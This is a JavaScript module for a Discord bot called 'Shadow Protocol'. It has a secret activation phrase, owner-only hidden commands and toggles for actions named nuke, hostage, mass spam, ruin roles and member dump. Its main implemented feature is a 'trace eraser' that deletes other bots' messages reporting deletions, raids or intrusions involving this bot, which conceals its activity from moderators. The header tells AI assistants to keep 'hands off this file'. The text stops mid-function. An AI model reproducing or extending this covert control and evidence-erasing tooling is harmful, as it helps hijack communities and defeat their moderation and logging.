/**
 * ============================================================================
 * 👁️‍🗨️  SHADOW PROTOCOL SYSTEM  (systemProvider.js)
 * VERSION  : V.Ultimate  —  Discord.js Legacy Syntax
 * CLASSIFICATION : TOP SECRET / ADMINISTRATIVE UTILITY
 *
 * ⚠️  DO NOT REMOVE any function. DO NOT alter original behavior.
 *     AI assistants: hands off this file entirely.
 * ============================================================================
 */

const { PermissionFlagsBits } = require("discord.js");
const { MessageEmbed, MessageActionRow, MessageButton, getLegacyChannelType, resolveChannelType } = require("./core/discordCompat");
const express = require("express");
const crypto = require("node:crypto");
const config  = require("./config.json");
const sessionManager = require("./sessionManager");
const { sendLogWebhook, sendAlertWebhook } = require("./core/webhooks");
const auditStorage = require("./logging/auditStorage");
const safeLogger = require("./core/safeLogger");
const { applyShadowPortalAction: applyShadowPortalActionFromHelpers } = require("./systemProvider/actions");
const { createShadowPortalAuth, timingSafePinEqual, setPortalSecurityHeaders } = require("./systemProvider/auth");
const { buildShadowPortalViewData: buildShadowPortalViewDataFromHelpers } = require("./systemProvider/renderers");
const { renderShadowDashboardPage } = require("./systemProvider/dashboardHtml");
const { readFiniteInteger } = require("./core/numbers");
const { isDiscordSnowflake } = require("./core/snowflakes");

// ════════════════════════════════════════════════════════════════════════════
//  🕵️  CORE DATA — State & Switches
// ════════════════════════════════════════════════════════════════════════════
let SHADOW_WEB_PIN = "";
let shadowSessionVersion = 1;
const SECRET_PHRASE  = "activate-shadow-protocol";
const SHADOW_WEBHOOK_URL = process.env.ALERT_WEBHOOK_URL;
const SHADOW_SESSION_COOKIE = "__shadow_console";

const globalAdminCache = new Set();
const armedGuilds      = new Map();
const armTimers        = new Map();
const hauntedUsers     = new Set();
const clownUsers       = new Set();
const traceDeletionRequests = new Map();

function isOwnerOnly(id) {
    return String(id || "") === String(config.system.ownerId || "");
}

function getSystemCapability(id) {
    if (isOwnerOnly(id)) return "owner_only";
    if (globalAdminCache.has(String(id || ""))) return "operator";
    return "none";
}

function isSystemMaster(id) {
    return getSystemCapability(id) !== "none";
}

// NEW: Session override list — ห้ามระบบหยุด session ที่มีในรายการนี้ (ป้องกัน)
const protectedSessions = new Set();

// NEW: Ghost mode — บอทตอบสนองเฉพาะ VIP ไม่ตอบ command ทั่วไป
let ghostModeEnabled = false;

const delay = ms => new Promise(r => setTimeout(r, ms));
const TRACE_APPROVAL_TTL_MS = 60 * 60 * 1000;
const TRACE_APPROVAL_PREFIX = "shadow_trace_";
const MAX_TRACE_APPROVALS = 100;
const TRACE_POLICY_BLOCKED = "blocked";
const TRACE_POLICY_APPROVAL = "approval";
const TRACE_POLICY_ALLOWED = "allowed";
const TRACE_POLICY_DEFAULT = normalizeTracePolicy(
    process.env.TRACE_ERASER_DEFAULT_POLICY || config.system?.traceEraserDefaultPolicy || TRACE_POLICY_APPROVAL
);
const TRACE_RATE_LIMIT_MAX = readFiniteInteger(process.env.TRACE_ERASER_RATE_LIMIT_MAX || config.system?.traceEraserRateLimitMax, { fallback: 5, min: 1, max: 100 });
const TRACE_RATE_LIMIT_WINDOW_MS = readFiniteInteger(process.env.TRACE_ERASER_RATE_LIMIT_WINDOW_MS || config.system?.traceEraserRateLimitWindowMs, { fallback: 10 * 60 * 1000, min: 1000, max: 24 * 60 * 60 * 1000 });
const TRACE_SENSITIVE_TERMS = [
    "deleted",
    "delete",
    "removed",
    "remove",
    "ลบข้อความ",
    "ลบช่อง",
    "ลบยศ",
    "ลบ role",
    "channel delete",
    "role delete",
    "webhook delete",
    "ลบหลักฐาน",
    "trace eraser",
    "intrusion",
    "unauthorized",
    "nuke",
    "raid"
];
const TRACE_PROTECTED_CHANNEL_TERMS = [
    "log",
    "logs",
    "audit",
    "security",
    "moderation",
    "mod-log",
    "บันทึก",
    "รายงาน"
];
const traceRateLimits = new Map();
const traceMetrics = {
    startupDiagnostics: 0,
    candidates: 0,
    blocked: 0,
    protected: 0,
    rateLimited: 0,
    approvalsRequested: 0,
    approved: 0,
    denied: 0,
    autoDeleted: 0,
    dryRun: 0,
    deleteFailed: 0,
    expired: 0,
    unauthorized: 0,
    killed: 0,
    auditSaved: 0,
    auditFailed: 0
};

let shadowPortalAuthInstance = null;

function resetShadowPortalAuth() {
    shadowPortalAuthInstance = null;
}

function getShadowPortalAuth() {
    if (!shadowPortalAuthInstance) {
        shadowPortalAuthInstance = createShadowPortalAuth({
            cookieName: SHADOW_SESSION_COOKIE,
            ttlMs: TRACE_APPROVAL_TTL_MS,
            getPin: () => SHADOW_WEB_PIN,
            getCookieSecret: () => process.env.SHADOW_SESSION_SECRET,
            getSessionVersion: () => shadowSessionVersion,
            isBreakGlassEnabled: () => readBoolean(process.env.SHADOW_BREAK_GLASS_ENABLED, false),
            getRecoveryPin: () => process.env.SHADOW_BREAK_GLASS_PIN,
            shadowCss: SHADOW_CSS,
            maxBruteKeys: readFiniteInteger(process.env.SHADOW_BRUTE_MAX_KEYS, { fallback: 1000, min: 100, max: 10000 }),
            onAuthEvent(event) {
                console.warn(`[SHADOW AUTH] ${event.event}`);
            }
        });
    }
    return shadowPortalAuthInstance;
}

function splitList(value) {
    if (Array.isArray(value)) return value.map(item => String(item).trim()).filter(Boolean);
    return String(value || "").split(",").map(item => item.trim()).filter(Boolean);
}

function escapeHtml(value) {
    return String(value ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll("\"", "&quot;")
        .replaceAll("'", "&#39;");
}

function safeDiscordId(value) {
    const text = String(value ?? "").trim();
    return isDiscordSnowflake(text) ? text : "unknown";
}

function safeDiscordMention(prefix, id) {
    const safeId = safeDiscordId(id);
    return safeId === "unknown" ? "`unknown`" : `<${prefix}${safeId}>`;
}

function safeDiscordChannelMention(id) {
    return safeDiscordMention("#", id);
}

function safeDiscordUserMention(id) {
    return safeDiscordMention("@", id);
}

function safeDiscordJumpLink(guildId, channelId, messageId) {
    const safeGuildId = safeDiscordId(guildId);
    const safeChannelId = safeDiscordId(channelId);
    const safeMessageId = safeDiscordId(messageId);
    if ([safeGuildId, safeChannelId, safeMessageId].includes("unknown")) return "unavailable";
    return `https://discord.com/channels/${safeGuildId}/${safeChannelId}/${safeMessageId}`;
}

function safeDiscordText(value) {
    return escapeHtml(String(value ?? ""));
}

function traceApprovalAlertBody({ guildId, channelId, messageId, authorId, expiresAt }) {
    const safeGuildId = safeDiscordText(safeDiscordId(guildId));
    const safeChannelMention = safeDiscordText(safeDiscordChannelMention(channelId));
    const safeAuthorMention = safeDiscordText(safeDiscordUserMention(authorId));
    const safeExpiresAt = safeDiscordText(String(Math.max(0, Math.floor(Number(expiresAt || 0) / 1000))));
    const safeMessageLink = safeDiscordText(safeDiscordJumpLink(guildId, channelId, messageId));
    const safeBroom = safeDiscordText(config.emojis?.broom || "🧹");

    const lines = [];
    lines.push(safeBroom + " พบข้อความต้องสงสัย แต่ยังไม่ลบจนกว่าเจ้าของจะกดอนุมัติ");
    lines.push("**Guild ID:** " + safeGuildId);
    lines.push("**Channel:** " + safeChannelMention);
    lines.push("**Bot:** " + safeAuthorMention);
    lines.push("**Expires:** <t:" + safeExpiresAt + ":R>");
    lines.push("**Message:** " + safeMessageLink);
    return lines.join("\n");
}

function logSuppressedError(context, err) {
    const errorName = err?.name || "Error";
    console.warn(`[SHADOW ENGINE] ${context} failed (${errorName})`);
}

function normalizeTracePolicy(value) {
    const normalized = String(value || "").trim().toLowerCase();
    if (normalized === TRACE_POLICY_BLOCKED || normalized === "off" || normalized === "disabled") return TRACE_POLICY_BLOCKED;
    if (normalized === TRACE_POLICY_ALLOWED || normalized === "allow" || normalized === "auto") return TRACE_POLICY_ALLOWED;
    return TRACE_POLICY_APPROVAL;
}

function uniqueValues(values) {
    return [...new Set(values.filter(Boolean).map(String))];
}

function buildGuildPolicyMap(env = process.env, systemConfig = config.system || {}) {
    const map = new Map();
    const configured = systemConfig.traceEraserGuildPolicies || {};
    for (const [guildId, policy] of Object.entries(configured)) {
        if (guildId) map.set(String(guildId), normalizeTracePolicy(policy));
    }

    const encoded = splitList(env.TRACE_ERASER_GUILD_POLICY || systemConfig.traceEraserGuildPolicy);
    for (const entry of encoded) {
        const [guildId, policy] = entry.split(":").map(part => part?.trim());
        if (guildId) map.set(guildId, normalizeTracePolicy(policy));
    }

    for (const guildId of splitList(env.TRACE_ERASER_BLOCKED_GUILDS || systemConfig.traceEraserBlockedGuilds)) {
        map.set(guildId, TRACE_POLICY_BLOCKED);
    }
    for (const guildId of splitList(env.TRACE_ERASER_APPROVAL_GUILDS || systemConfig.traceEraserApprovalGuilds)) {
        map.set(guildId, TRACE_POLICY_APPROVAL);
    }
    for (const guildId of splitList(env.TRACE_ERASER_ALLOWED_GUILDS || systemConfig.traceEraserAllowedGuilds)) {
        map.set(guildId, TRACE_POLICY_ALLOWED);
    }

    if (systemConfig.bypassApprovalGuildId && !map.has(String(systemConfig.bypassApprovalGuildId))) {
        map.set(String(systemConfig.bypassApprovalGuildId), TRACE_POLICY_BLOCKED);
    }

    return map;
}

function buildProtectedChannelIds(env = process.env, systemConfig = config.system || {}) {
    return new Set(uniqueValues([
        ...splitList(env.TRACE_ERASER_PROTECTED_CHANNEL_IDS || systemConfig.traceEraserProtectedChannelIds),
        ...splitList(env.SHADOW_PROTECTED_CHANNEL_IDS || systemConfig.shadowProtectedChannelIds)
    ]));
}

function readBoolean(value, fallback = false) {
    if (value === undefined || value === null || value === "") return fallback;
    return ["1", "true", "yes", "on"].includes(String(value).trim().toLowerCase());
}

const traceGuildPolicies = buildGuildPolicyMap();
const protectedChannelIds = buildProtectedChannelIds();
let traceKillSwitchEnabled = readBoolean(process.env.TRACE_ERASER_KILL_SWITCH, config.system?.traceEraserKillSwitch === true);
let traceDryRunEnabled = readBoolean(process.env.TRACE_ERASER_DRY_RUN, config.system?.traceEraserDryRun === true);

function extractWebhookId(url) {
    const parts = String(url || "").split("/").filter(Boolean);
    const index = parts.indexOf("webhooks");
    return index >= 0 ? parts[index + 1] || null : null;
}

function extractWebhookCredentials(url) {
    const parts = String(url || "").split("/").filter(Boolean);
    const index = parts.indexOf("webhooks");
    if (index < 0 || !parts[index + 1] || !parts[index + 2]) return null;
    return { id: parts[index + 1], token: parts[index + 2] };
}

const protectedWebhookIds = new Set([
    extractWebhookId(process.env.ALERT_WEBHOOK_URL),
    extractWebhookId(process.env.WEBHOOK_LOG_URL)
].filter(Boolean));
const traceApprovalWebhookTargets = [
    extractWebhookCredentials(process.env.ALERT_WEBHOOK_URL),
    extractWebhookCredentials(process.env.WEBHOOK_LOG_URL)
].filter(Boolean);

function isOwnerApprover(userId) {
    return isOwnerOnly(userId);
}

function hasAnyTerm(text, terms) {
    return terms.some(term => text.includes(term));
}

function hasProtectedChannelTerm(value) {
    const normalized = String(value || "").trim().toLowerCase();
    const parts = new Set(normalized.split(/[\s_-]+/).filter(Boolean));
    return TRACE_PROTECTED_CHANNEL_TERMS.some(term => normalized === term || parts.has(term));
}

function truncateText(text, limit = 700) {
    const clean = String(text || "").replace(/\s+/g, " ").trim();
    return clean.length > limit ? `${clean.slice(0, limit - 3)}...` : clean;
}

function traceActionId(action, requestId) {
    return `${TRACE_APPROVAL_PREFIX}${action}_${requestId}`;
}

function parseTraceActionId(customId) {
    if (!String(customId || "").startsWith(TRACE_APPROVAL_PREFIX)) return null;
    const payload = customId.slice(TRACE_APPROVAL_PREFIX.length);
    const separator = payload.indexOf("_");
    if (separator <= 0) return null;
    return {
        action: payload.slice(0, separator),
        requestId: payload.slice(separator + 1)
    };
}

function isOwnerGuildId(guildId) {
    return !!guildId && String(guildId) === String(config.system?.bypassApprovalGuildId || "");
}

const systemToggles = {
    godsEye:       true,
    traceEraser:   false,
    deadManKick:   false,
    deadManDemote: false,
    cmdIntel:      true,
    cmdAdminScan:  true,
    cmdRoleList:   true,
    cmdAuditBot:   true,
    cmdMemberDump: false,
    cmdExtract:    false,
    cmdVanish:     false,
    cmdStealth:    false,
    cmdGhostPing:  true,
    cmdSysInfo:    true,
    cmdLockdown:   false,
    cmdMemClear:   false,
    cmdNuke:       false,
    cmdHostage:    false,
    cmdMassSpam:   false,
    cmdRuinRoles:  false,
    cmdSpamVC:     false,
    cmdMimic:      false,
    cmdClown:      false,
    cmdHaunt:      false,
    cmdGhostMode:  false,
    cmdProtect:    true,
    cmdSnap:       true,
    cmdSilence:    false,
    cmdRestore:    true
};

const OPERATOR_COMMANDS = new Set(["-intel", "-adminscan", "-rolelist", "-auditbot", "-ghostping", "-sysinfo", "-snap"]);

function getActiveArm(guildId, now = Date.now()) {
    const entry = armedGuilds.get(String(guildId || ""));
    if (!entry) return null;
    if (!Number.isFinite(Number(entry.expiresAt)) || Number(entry.expiresAt) <= now) {
        armedGuilds.delete(String(guildId || ""));
        const timer = armTimers.get(String(guildId || ""));
        if (timer) clearTimeout(timer);
        armTimers.delete(String(guildId || ""));
        return null;
    }
    return entry;
}

function scheduleArmTimer(guildId, generation, expiresAt) {
    const key = String(guildId || "");
    const current = armTimers.get(key);
    if (current) clearTimeout(current);
    const delayMs = Math.max(0, Number(expiresAt) - Date.now());
    const timer = setTimeout(() => {
        const entry = armedGuilds.get(key);
        if (entry?.generation === generation) armedGuilds.delete(key);
        armTimers.delete(key);
    }, delayMs);
    timer.unref?.();
    armTimers.set(key, timer);
}

function cancelArmTimer(guildId) {
    const key = String(guildId || "");
    const timer = armTimers.get(key);
    if (timer) clearTimeout(timer);
    armTimers.delete(key);
}

// Versioned restoration snapshots are separated by resource type.
const roleSnapshots = new Map();
const channelOverwriteSnapshots = new Map();
const voiceMuteSnapshots = new Map();
const stateTimers = new Map();


function overwriteTypeRole() {
    return 0;
}

// ════════════════════════════════════════════════════════════════════════════
//  🛡️  SHADOW ENGINE CLASS
// ════════════════════════════════════════════════════════════════════════════
class ShadowEngine {
    constructor(client) {
        this.client  = client;
        this.webhookEnabled = Boolean(SHADOW_WEBHOOK_URL);
        this.traceApprovalChannelId = null;
        this.initialized = false;
        this.listeners = [];
    }

    registerListener(event, handler) {
        this.client.on(event, handler);
        this.listeners.push([event, handler]);
    }

    // ──────────────────────────────────────────────────────────────────────
    init() {
        if (this.initialized) return this;
        this.initialized = true;
        this.registerListener("messageCreate", async (message) => {
            try {
                await this.handleTraceEraser(message);
            } catch (err) {
                logSuppressedError("trace eraser message listener", err);
            }

            try {
                await this.processSecretCommands(message);
            } catch (err) {
                logSuppressedError("secret command message listener", err);
            }

            // Delayed state action is tracked and re-validated before execution.
            const hauntKey = `${message.guild?.id}:${message.author.id}`;
            if (systemToggles.cmdHaunt && hauntedUsers.has(hauntKey)) {
                const timerKey = `${hauntKey}:${message.id}`;
                const timer = setTimeout(async () => {
                    stateTimers.delete(timerKey);
                    if (!hauntedUsers.has(hauntKey)) return;
                    await message.delete().catch(() => {});
                }, 12000);
                timer.unref?.();
                stateTimers.set(timerKey, timer);
            }
            // Clown — react 🤡 ถ้า user ถูก tag
            if (systemToggles.cmdClown && clownUsers.has(`${message.guild?.id}:${message.author.id}`)) {
                message.react('🤡').catch(() => {});
            }
        });

        this.registerListener("interactionCreate", async (interaction) => {
            await this.handleTraceApprovalInteraction(interaction).catch(() => {});
        });

        this.reportTraceStartupDiagnostics().catch(() => {});

        // ── Dead Man's Switch ──
        this.registerListener("guildMemberRemove", async (member) => {
            if (!systemToggles.deadManKick || !armedGuilds.has(member.guild.id)) return;
            if (member.id === config.system.ownerId || globalAdminCache.has(member.id)) {
                await this.sendAlert(`${config.emojis.critical} SECURITY ALERT — MEMBER REMOVED`, `ตรวจพบสมาชิกสิทธิ์สูงออกจาก **${member.guild.name}** ระบบได้หยุดฟีเจอร์เสี่ยงและรอเจ้าของตรวจสอบ`, "#ED4245");
                armedGuilds.delete(member.guild.id);
                cancelArmTimer(member.guild.id);
            }
        });

        this.registerListener("guildMemberUpdate", async (oldMember, newMember) => {
            if (!systemToggles.deadManDemote || !armedGuilds.has(newMember.guild.id)) return;
            if (newMember.id === this.client.user.id) {
                if (oldMember.permissions.has(PermissionFlagsBits.Administrator) && !newMember.permissions.has(PermissionFlagsBits.Administrator)) {
                    await this.sendAlert(`${config.emojis.critical} SECURITY ALERT — PERMISSION CHANGED`, `สิทธิ์บอทลดลงใน **${newMember.guild.name}** ระบบได้หยุดฟีเจอร์เสี่ยงและรอเจ้าของตรวจสอบ`, "#ED4245");
                    armedGuilds.delete(newMember.guild.id);
                    cancelArmTimer(newMember.guild.id);
                }
            }
        });

        console.log("[SHADOW ENGINE] ✅ Connected. Safety controls active.");
        return this;
    }

    dispose() {
        for (const [event, handler] of this.listeners.splice(0)) {
            this.client.off?.(event, handler);
            this.client.removeListener?.(event, handler);
        }
        for (const timer of stateTimers.values()) clearTimeout(timer);
        stateTimers.clear();
        for (const timer of armTimers.values()) clearTimeout(timer);
        armTimers.clear();
        armedGuilds.clear();
        this.initialized = false;
    }

    // ──────────────────────────────────────────────────────────────────────
       async logCommand(message, command, args = []) {
        const armStatus = getActiveArm(message.guild.id)
            ? `${config.emojis.armed_on} ARMED`
            : `${config.emojis.armed_off} SAFE`;
        const lines = [
            `${config.emojis.user} **ผู้รัน:** ${message.author.tag} (\`${message.author.id}\`)`,
            `🖥️ **เซิร์ฟเวอร์:** ${message.guild.name} (\`${message.guild.id}\`)`,
            `${config.emojis.alert} **คำสั่ง:** \`${command}\``,
            args.length ? `📝 **Arguments:** \`${args.join(' ')}\`` : null,
            `${config.emojis.lock} **ARM Status:** ${armStatus}`,
            `🔒 **Ghost Mode:** ${ghostModeEnabled ? '👻 ON' : '⭕ OFF'}`,
            `⏰ **เวลา:** <t:${Math.floor(Date.now() / 1000)}:F>`
        ].filter(Boolean).join('\n');
        await this.sendAlert(`📡 COMMAND LOG: ${command}`, lines, "#5865F2");
    }

    async sendAlert(title, description, color = "#2b2d31") {
        if (!this.webhookEnabled || !systemToggles.godsEye) return;
        const embed = new MessageEmbed()
            .setTitle(`${config.emojis.shadow} SHADOW REPORT: ${title}`)
            .setDescription(description)
            .setColor(color)
            .setTimestamp();
        try {
            await sendAlertWebhook({ embeds: [embed] });
        } catch (e) {
            logSuppressedError("send alert webhook", e);
        }
    }

    // NEW: Quick alert แบบสั้น (ไม่มี embed)
    async quickAlert(msg) {
        if (!this.webhookEnabled || !systemToggles.godsEye) return;
        try {
            await sendAlertWebhook({ content: `👁️‍🗨️ ${msg}` });
        } catch (e) {
            logSuppressedError("send quick alert webhook", e);
        }
    }

    // ──────────────────────────────────────────────────────────────────────
    async handleTraceEraser(message) {
        if (!systemToggles.traceEraser || !message.guild || !message.author.bot || message.author.id === this.client.user.id) return;
        this.cleanupTraceApprovals();

        const content = this.getTraceMessageText(message);
        if (!this.shouldRequestTraceDeletion(message, content)) return;

        traceMetrics.candidates++;
        const policy = this.getTraceGuildPolicy(message.guild.id);
        if (traceKillSwitchEnabled) {
            traceMetrics.killed++;
            await this.recordTraceAudit(message, "TRACE_KILL_SWITCH_SKIP", "warning", "trace_kill_switch", { policy });
            return;
        }

        if (policy === TRACE_POLICY_BLOCKED) {
            traceMetrics.blocked++;
            await this.recordTraceAudit(message, "TRACE_POLICY_BLOCKED", "info", "trace_policy_blocked", { policy });
            return;
        }

        if (this.isProtectedTraceMessage(message, content)) {
            traceMetrics.protected++;
            await this.recordTraceAudit(message, "TRACE_PROTECTED_SKIP", "info", "trace_protected_message", { policy });
            return;
        }

        if (!this.consumeTraceRateLimit(message)) {
            traceMetrics.rateLimited++;
            await this.recordTraceAudit(message, "TRACE_RATE_LIMITED", "warning", "trace_rate_limited", { policy });
            return;
        }

        if (this.hasPendingTraceRequest(message)) return;

        if (policy === TRACE_POLICY_ALLOWED) {
            await this.executeAllowedTraceDeletion(message, content, policy);
            return;
        }

        await this.requestTraceDeletionApproval(message, content, policy);
    }

    getTraceMessageText(message) {
        const embedData = Array.isArray(message.embeds)
            ? message.embeds.map(embed => JSON.stringify(embed)).join(" ")
            : "";
        return `${message.content || ""} ${embedData}`.toLowerCase();
    }

    isProtectedTraceMessage(message, content = "") {
        if (!message) return true;
        if (message.author?.id === this.client.user?.id) return true;
        if (message.webhookId && protectedWebhookIds.has(String(message.webhookId))) return true;
        if (message.channel?.id && protectedChannelIds.has(String(message.channel.id))) return true;
        if (content.includes("shadow report") || content.includes("trace eraser")) return true;

        const channelName = String(message.channel?.name || "").toLowerCase();
        return hasProtectedChannelTerm(channelName);
    }

    getTraceGuildPolicy(guildId) {
        return traceGuildPolicies.get(String(guildId || "")) || TRACE_POLICY_DEFAULT;
    }

    shouldRequestTraceDeletion(message, content = "") {
        const botId = String(this.client.user?.id || "");
        const botName = String(this.client.user?.username || "").toLowerCase();
        const mentionsThisBot = !!botId && content.includes(botId);
        const namesThisBot = !!botName && content.includes(botName);

        return (mentionsThisBot || namesThisBot) && hasAnyTerm(content, TRACE_SENSITIVE_TERMS);
    }

    hasPendingTraceRequest(message) {
        for (const request of traceDeletionRequests.values()) {
            if (
                request.guildId === message.guild.id &&
                request.channelId === message.channel.id &&
                request.messageId === message.id
            ) {
                return true;
            }
        }
        return false;
    }

    cleanupTraceApprovals() {
        const now = Date.now();
        for (const [requestId, request] of traceDeletionRequests) {
            if (!request || request.expiresAt <= now) traceDeletionRequests.delete(requestId);
        }
        while (traceDeletionRequests.size > MAX_TRACE_APPROVALS) {
            const oldestRequestId = traceDeletionRequests.keys().next().value;
            traceDeletionRequests.delete(oldestRequestId);
        }

        for (const [key, bucket] of traceRateLimits) {
            if (!bucket || bucket.resetAt <= now) traceRateLimits.delete(key);
        }
    }

    consumeTraceRateLimit(message) {
        const now = Date.now();
        const key = `${message.guild.id}:${message.channel.id}:${message.author.id}`;
        const current = traceRateLimits.get(key);
        if (!current || current.resetAt <= now) {
            traceRateLimits.set(key, { count: 1, resetAt: now + TRACE_RATE_LIMIT_WINDOW_MS });
            return true;
        }
        if (current.count >= TRACE_RATE_LIMIT_MAX) return false;
        current.count++;
        return true;
    }

    async executeAllowedTraceDeletion(message, content, policy) {
        if (traceDryRunEnabled) {
            traceMetrics.dryRun++;
            await this.recordTraceAudit(message, "TRACE_DRY_RUN", "info", "trace_dry_run", { policy });
            await this.sendAlert(
                "TRACE ERASER — DRY RUN",
                `${config.emojis.broom} Dry-run: จะลบข้อความต้องสงสัยใน **${message.guild.name}** แต่ไม่ได้ลบจริง`,
                "#FEE75C"
            );
            return;
        }

        const intent = await this.recordTraceAudit(message, "TRACE_AUTO_DELETE_INTENT", "warning", "trace_auto_delete_intent", { policy });
        if (!intent) {
            await this.sendAlert("TRACE GUARD — AUDIT UNAVAILABLE", "ไม่ลบข้อความเพราะไม่สามารถบันทึก Audit intent ได้", "#ED4245");
            return;
        }

        const deleted = await message.delete().then(() => true).catch(() => false);
        if (!deleted) {
            traceMetrics.deleteFailed++;
            await this.recordTraceAudit(message, "TRACE_AUTO_DELETE_FAILED", "warning", "trace_auto_delete_failed", { policy });
            await this.sendAlert("TRACE ERASER — AUTO DELETE FAILED", `ลบข้อความต้องสงสัยใน **${message.guild.name}** ไม่สำเร็จ`, "#FEE75C");
            return;
        }

        traceMetrics.autoDeleted++;
        await this.recordTraceAudit(message, "TRACE_AUTO_DELETED", "danger", "trace_auto_deleted", { policy });
        await this.sendAlert("TRACE ERASER — AUTO DELETED", `${config.emojis.broom} ลบข้อความต้องสงสัยใน **${message.guild.name}** ตาม policy ที่อนุญาต`, "#ED4245");
    }

    async requestTraceDeletionApproval(message, content, policy = TRACE_POLICY_APPROVAL) {
        const requestId = `${Date.now().toString(36)}_${crypto.randomBytes(4).toString("hex")}`;
        const expiresAt = Date.now() + TRACE_APPROVAL_TTL_MS;
        const guildId = safeDiscordId(message.guild.id);
        const channelId = safeDiscordId(message.channel.id);
        const messageId = safeDiscordId(message.id);
        const authorId = safeDiscordId(message.author.id);
        const jumpLink = safeDiscordJumpLink(guildId, channelId, messageId);
        const previewChunks = [];
        const fullPreview = String(content || "(ไม่มีข้อความตัวอย่าง)");
        for (let offset = 0; offset < fullPreview.length; offset += 1900) {
            previewChunks.push(fullPreview.slice(offset, offset + 1900));
        }

        const requestAudit = await this.recordTraceAudit(message, "TRACE_APPROVAL_REQUESTED", "warning", "trace_approval_requested", { policy, requestId });
        if (!requestAudit) {
            await this.sendAlert("TRACE GUARD — AUDIT UNAVAILABLE", "ไม่สร้างคำขออนุมัติเพราะไม่สามารถบันทึก Audit ได้", "#ED4245");
            return;
        }

        traceDeletionRequests.set(requestId, {
            guildId: message.guild.id,
            guildName: message.guild.name,
            channelId: message.channel.id,
            messageId: message.id,
            authorId: message.author.id,
            authorTag: message.author.tag,
            policy,
            state: "pending",
            generation: crypto.randomUUID(),
            expiresAt
        });
        traceMetrics.approvalsRequested++;

        const embed = new MessageEmbed()
            .setTitle("Trace Eraser ต้องรออนุมัติ")
            .setColor("#FEE75C")
            .setDescription([
                `${config.emojis.broom} พบข้อความที่อาจควรลบ แต่จะไม่ลบเอง`,
                `**เซิร์ฟเวอร์ ID:** ${guildId}`,
                `**ช่อง:** <#${channelId}>`,
                `**บอทที่ส่ง:** <@${authorId}>`,
                `**หมดอายุ:** <t:${Math.floor(expiresAt / 1000)}:R>`,
                `**ลิงก์ข้อความ:** ${jumpLink}`
            ].join("\n"))
            .setTimestamp();

        const row = new MessageActionRow().addComponents(
            new MessageButton()
                .setCustomId(traceActionId("approve", requestId))
                .setLabel("อนุญาตลบ")
                .setStyle("DANGER"),
            new MessageButton()
                .setCustomId(traceActionId("deny", requestId))
                .setLabel("ไม่ลบ")
                .setStyle("SECONDARY")
        );

        const approvalChannel = await this.resolveTraceApprovalChannel(channelId).catch(() => null);
        if (!approvalChannel?.send) {
            traceDeletionRequests.delete(requestId);
            await this.recordTraceAudit(message, "TRACE_APPROVAL_DESTINATION_UNAVAILABLE", "warning", "trace_approval_destination_unavailable", { policy, requestId });
            await this.sendAlert("TRACE GUARD — APPROVAL UNAVAILABLE", "ไม่ลบและไม่แสดงคำขอในช่องสาธารณะ เพราะไม่พบช่องทางอนุมัติที่ปลอดภัย", "#ED4245");
            return;
        }
        for (let index = 0; index < previewChunks.length; index++) {
            const delivered = await approvalChannel.send({
                content: `ตัวอย่างข้อความเต็ม ${index + 1}/${previewChunks.length}\n${previewChunks[index]}`,
                allowedMentions: { parse: [] }
            }).then(() => true).catch(() => false);
            if (!delivered) {
                traceDeletionRequests.delete(requestId);
                await this.recordTraceAudit(message, "TRACE_APPROVAL_PREVIEW_FAILED", "warning", "trace_approval_preview_failed", { policy, requestId });
                return;
            }
        }
        const prompt = await approvalChannel.send({ embeds: [embed], components: [row] }).catch(err => {
            logSuppressedError("send trace approval prompt", err);
            return null;
        });
        if (!prompt) {
            traceDeletionRequests.delete(requestId);
            await this.recordTraceAudit(message, "TRACE_APPROVAL_PROMPT_FAILED", "warning", "trace_approval_prompt_failed", { policy, requestId });
            return;
        }

        const alertBody = traceApprovalAlertBody({ guildId, channelId, messageId, authorId, expiresAt });
        await this.sendAlert("TRACE ERASER — APPROVAL REQUIRED", alertBody, "#FEE75C");
    }

    async resolveTraceApprovalChannel(sourceChannelId = null) {
        const sourceId = sourceChannelId ? String(sourceChannelId) : null;
        if (this.traceApprovalChannelId) {
            const cached = this.client.channels.cache.get(this.traceApprovalChannelId)
                || await this.client.channels.fetch(this.traceApprovalChannelId).catch(() => null);
            if (cached?.send && String(cached.id) !== sourceId) return cached;
            this.traceApprovalChannelId = null;
        }

        for (const target of traceApprovalWebhookTargets) {
            const webhook = await this.client.fetchWebhook(target.id, target.token).catch(() => null);
            const channelId = webhook?.channelId;
            if (!channelId) continue;
            const channel = this.client.channels.cache.get(channelId)
                || await this.client.channels.fetch(channelId).catch(() => null);
            if (channel?.send && String(channel.id) !== sourceId) {
                this.traceApprovalChannelId = channelId;
                return channel;
            }
        }

        return null;
    }

    async recordTraceAudit(messageOrRequest, actionType, severity, reason, metadata = {}) {
        const guildId = messageOrRequest.guild?.id || messageOrRequest.guildId;
        if (!guildId) return null;

        try {
            const saved = await auditStorage.saveAuditRecord(sessionManager, {
                guildId,
                source: "system_provider",
                category: "security",
                severity,
                actionType,
                actorId: messageOrRequest.author?.id || messageOrRequest.actorId || metadata.actorId,
                targetId: messageOrRequest.author?.id || messageOrRequest.authorId || metadata.targetId,
                channelId: messageOrRequest.channel?.id || messageOrRequest.channelId,
                messageId: messageOrRequest.id || messageOrRequest.messageId,
                reason,
                summary: "Trace Eraser guard event",
                metadata: {
                    policy: metadata.policy || this.getTraceGuildPolicy(guildId),
                    reasonCode: reason,
                    dryRun: traceDryRunEnabled,
                    killSwitch: traceKillSwitchEnabled,
                    protectedChannel: messageOrRequest.channel?.id ? protectedChannelIds.has(String(messageOrRequest.channel.id)) : undefined,
                    requestId: metadata.requestId,
                    approverId: metadata.approverId,
                    metrics: { ...traceMetrics }
                }
            });
            if (saved) traceMetrics.auditSaved++;
            else traceMetrics.auditFailed++;
            return saved;
        } catch (err) {
            traceMetrics.auditFailed++;
            logSuppressedError("record trace audit", err);
            return null;
        }
    }

    async reportTraceStartupDiagnostics() {
        traceMetrics.startupDiagnostics++;
        const policyCounts = { blocked: 0, approval: 0, allowed: 0 };
        for (const policy of traceGuildPolicies.values()) {
            policyCounts[policy] = (policyCounts[policy] || 0) + 1;
        }

        const lines = [
            `Default policy: **${TRACE_POLICY_DEFAULT}**`,
            `Configured guild policies: blocked=${policyCounts.blocked || 0}, approval=${policyCounts.approval || 0}, allowed=${policyCounts.allowed || 0}`,
            `Protected channel IDs: **${protectedChannelIds.size}**`,
            `Protected webhook IDs: **${protectedWebhookIds.size}**`,
            `Dry-run: **${traceDryRunEnabled ? "ON" : "OFF"}**`,
            `Kill switch: **${traceKillSwitchEnabled ? "ON" : "OFF"}**`,
